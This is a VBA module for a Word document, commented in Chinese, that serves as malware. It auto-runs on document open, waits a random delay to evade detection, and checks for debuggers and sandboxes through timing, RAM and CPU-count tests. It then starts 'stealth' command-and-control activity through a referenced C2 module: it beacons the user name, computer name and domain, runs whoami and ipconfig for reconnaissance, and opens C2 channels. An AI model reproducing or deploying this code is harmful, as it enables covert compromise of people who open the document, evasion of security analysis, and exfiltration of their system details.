Attribute VB_Name = "StartupModule"
' =============================================================================
' STARTUP MODULE - 文件開啟自動執行宏
' =============================================================================
' 此模組包含文件開啟時自動執行的宏
' 使用標準的AutoOpen和Document_Open事件
' =============================================================================

Option Explicit

' =============================================================================
' API 聲明 (必須放在模塊頂部)
' =============================================================================

Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
Private Declare PtrSafe Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long

Private Type SYSTEM_INFO
    dwOemId As Long
    dwPageSize As Long
    lpMinimumApplicationAddress As Long
    lpMaximumApplicationAddress As Long
    dwActiveProcessorMask As Long
    dwNumberOfProcessors As Long
    dwProcessorType As Long
    dwAllocationGranularity As Long
    wProcessorLevel As Integer
    wProcessorRevision As Integer
End Type

Private Type MEMORYSTATUSEX
    dwLength As Long
    dwMemoryLoad As Long
    ullTotalPhys As Currency
    ullAvailPhys As Currency
    ullTotalPageFile As Currency
    ullAvailPageFile As Currency
    ullTotalVirtual As Currency
    ullAvailVirtual As Currency
    ullAvailExtendedVirtual As Currency
End Type

' =============================================================================
' 文件開啟自動執行事件
' =============================================================================

Public Sub AutoOpen()
    ' Word文件開啟時自動執行
    On Error GoTo ErrorHandler
    
    Debug.Print "AutoOpen宏執行中 - 文件已開啟"
    
    ' 延遲執行以避免立即檢測
    Application.OnTime Now + TimeValue("00:00:03"), "DelayedStartup"
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "AutoOpen錯誤: " & Err.Description
End Sub

Public Sub Document_Open()
    ' Document開啟事件（與AutoOpen類似）
    On Error GoTo ErrorHandler
    
    Debug.Print "Document_Open事件觸發"
    
    ' 隨機延遲2-5秒
    Randomize
    Dim delaySeconds As Integer
    delaySeconds = Int((5 - 2 + 1) * Rnd() + 2)
    
    Application.OnTime Now + TimeValue("00:00:0" & delaySeconds), "DelayedStartup"
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "Document_Open錯誤: " & Err.Description
End Sub

' =============================================================================
' 延遲啟動函數
' =============================================================================

Private Sub DelayedStartup()
    ' 延遲執行的啟動功能
    On Error GoTo ErrorHandler
    
    Debug.Print "延遲啟動執行中..."
    
    ' 檢查環境安全性
    If Not IsEnvironmentSafe() Then
        Debug.Print "環境不安全，終止執行"
        Exit Sub
    End If
    
    ' 執行隱蔽的C2初始化
    ExecuteStealthC2
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "延遲啟動錯誤: " & Err.Description
End Sub

' =============================================================================
' 環境檢測函數
' =============================================================================

Private Function IsEnvironmentSafe() As Boolean
    ' 檢查是否為安全執行環境
    On Error GoTo ErrorHandler
    
    ' 簡單的環境檢查
    If IsDebuggerPresent() Then
        Debug.Print "調試器檢測到"
        IsEnvironmentSafe = False
        Exit Function
    End If
    
    ' 檢查是否在沙箱環境中
    If IsSandboxEnvironment() Then
        Debug.Print "沙箱環境檢測到"
        IsEnvironmentSafe = False
        Exit Function
    End If
    
    IsEnvironmentSafe = True
    Exit Function
    
ErrorHandler:
    IsEnvironmentSafe = False
End Function

Private Function IsDebuggerPresent() As Boolean
    ' 簡單的調試器檢測
    On Error GoTo ErrorHandler
    
    ' 嘗試執行可能被調試器捕獲的操作
    Dim testVar As Long
    testVar = GetTickCount
    
    ' 如果時間差異異常，可能處於調試狀態
    If Abs(GetTickCount - testVar) > 1000 Then
        IsDebuggerPresent = True
    Else
        IsDebuggerPresent = False
    End If
    
    Exit Function
    
ErrorHandler:
    IsDebuggerPresent = True
End Function

Private Function IsSandboxEnvironment() As Boolean
    ' 簡單的沙箱環境檢測
    On Error GoTo ErrorHandler
    
    ' 檢查內存大小（沙箱通常內存較小）
    Dim memInfo As MEMORYSTATUSEX
    memInfo.dwLength = Len(memInfo)
    
    If GlobalMemoryStatusEx(memInfo) Then
        If memInfo.ullTotalPhys < 2147483648 Then ' 少於2GB
            IsSandboxEnvironment = True
            Exit Function
        End If
    End If
    
    ' 檢查CPU核心數
    Dim procInfo As SYSTEM_INFO
    GetSystemInfo procInfo
    
    If procInfo.dwNumberOfProcessors < 2 Then
        IsSandboxEnvironment = True
        Exit Function
    End If
    
    IsSandboxEnvironment = False
    Exit Function
    
ErrorHandler:
    IsSandboxEnvironment = True
End Function

' =============================================================================
' 隱蔽執行函數
' =============================================================================

Private Sub ExecuteStealthC2()
    ' 執行隱蔽的C2通信
    On Error GoTo ErrorHandler
    
    Debug.Print "執行隱蔽C2通信..."
    
    ' 隨機選擇執行模式以避免模式檢測
    Select Case Second(Now) Mod 4
        Case 0
            ' 模式A: 只發送系統信息信標
            SendSystemInfoBeacon
        Case 1
            ' 模式B: 初始化C2連接
            C2MainModule.InitializeC2Connection
        Case 2
            ' 模式C: 建立Edge C2通道
            C2MainModule.EstablishEdgeC2
        Case 3
            ' 模式D: 執行基本偵察命令
            ExecuteBasicRecon
    End Select
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "隱蔽C2執行錯誤: " & Err.Description
End Sub

Private Sub SendSystemInfoBeacon()
    ' 發送系統信息信標
    On Error GoTo ErrorHandler
    
    Dim systemInfo As String
    systemInfo = "AutoStart-User: " & Environ("USERNAME") & ";" & _
                "Computer: " & Environ("COMPUTERNAME") & ";" & _
                "Domain: " & Environ("USERDOMAIN") & ";" & _
                "Time: " & Format(Now(), "yyyy-mm-dd hh:nn:ss")
    
    If C2MainModule.SendBeacon(systemInfo) Then
        Debug.Print "自動啟動信標發送成功"
    Else
        Debug.Print "自動啟動信標發送失敗"
    End If
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "信標發送錯誤: " & Err.Description
End Sub

Private Sub ExecuteBasicRecon()
    ' 執行基本系統偵察
    On Error GoTo ErrorHandler
    
    Dim result As String
    
    ' 獲取當前用戶信息
    result = C2MainModule.ExecuteCommand("whoami")
    Debug.Print "當前用戶: " & result
    
    ' 獲取網絡配置
    result = C2MainModule.ExecuteCommand("ipconfig")
    Debug.Print "網絡配置信息已獲取"
    
    ' 發送偵察數據
    SendSystemInfoBeacon
    
    Exit Sub

ErrorHandler:
    Debug.Print "偵察執行錯誤: " & Err.Description
End Sub
